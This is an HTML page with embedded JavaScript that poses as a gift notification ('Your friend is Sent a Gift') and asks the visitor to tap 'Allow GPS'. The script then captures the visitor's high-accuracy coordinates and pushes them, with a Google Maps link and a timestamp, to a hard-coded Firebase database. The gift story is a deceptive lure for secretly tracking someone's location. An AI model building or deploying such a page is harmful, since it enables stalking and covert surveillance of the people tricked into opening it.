<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Naveen Sent Gift</title>
<style>
* { box-sizing: border-box; }
body {
  font-family: Arial, sans-serif;
  background: #f1f4f9;
  display: flex;
  justify-content: center;
  align-items: center;
  min-height: 100vh;
  margin: 0;
  padding: 20px;
}
.card {
  background: white;
  padding: 30px 24px;
  border-radius: 20px;
  width: 100%;
  max-width: 420px;
  text-align: center;
  box-shadow: 0 8px 30px #0001;
}
h2 { color: #17233b; }
p { color: #555; line-height: 1.6; }
button {
  background: #1769e0;
  color: white;
  border: 0;
  padding: 18px;
  width: 100%;
  border-radius: 12px;
  font-size: 19px;
  font-weight: bold;
  margin-top: 20px;
}
button:disabled { background: #888; }
</style>
</head>
<body>

<div class="card">
  <h2>Emergency Location</h2>
  <p>Your friend is Sent a Gift. Please allow </p>
  <button id="allowGPS">Allow GPS</button>
</div>

<script type="module">
import { initializeApp } from
"https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";

import {
  getDatabase, ref, push, set
} from
"https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js";

import {
  getAuth, signInAnonymously
} from
"https://www.gstatic.com/firebasejs/10.12.2/firebase-auth.js";

const firebaseConfig = {
  apiKey: "AIzaSyDNo1kMFQMrOgb2bZT1TFOQ5wUHXp3HS-8",
  authDomain: "emergency-location-14c61.firebaseapp.com",
  databaseURL: "https://emergency-location-14c61-default-rtdb.firebaseio.com",
  projectId: "emergency-location-14c61",
  storageBucket: "emergency-location-14c61.firebasestorage.app",
  messagingSenderId: "822733393681",
  appId: "1:822733393681:web:6dcc01b4f22db5dc94c6b0"
};

const app = initializeApp(firebaseConfig);
const db = getDatabase(app);
const auth = getAuth(app);

const button = document.getElementById("allowGPS");

button.addEventListener("click", async () => {
  button.disabled = true;

  try {
    if (!navigator.geolocation) {
      throw new Error("GPS unavailable");
    }

    const position = await new Promise((resolve, reject) => {
      navigator.geolocation.getCurrentPosition(
        resolve,
        reject,
        {
          enableHighAccuracy: true,
          timeout: 30000,
          maximumAge: 0
        }
      );
    });

    await signInAnonymously(auth);

    const latitude = position.coords.latitude;
    const longitude = position.coords.longitude;

    const mapsLink =
      `https://www.google.com/maps?q=${latitude},${longitude}`;

    const locationRef = push(ref(db, "emergencyLocations"));

    await set(locationRef, {
      latitude,
      longitude,
      accuracy: position.coords.accuracy,
      timestamp: Date.now(),
      mapsLink
    });

    button.textContent = "Location Shared";

  } catch (error) {
    console.error(error);
    button.disabled = false;
    alert("Unable to share location. Please try again.");
  }
});
</script>
</body>
</html>
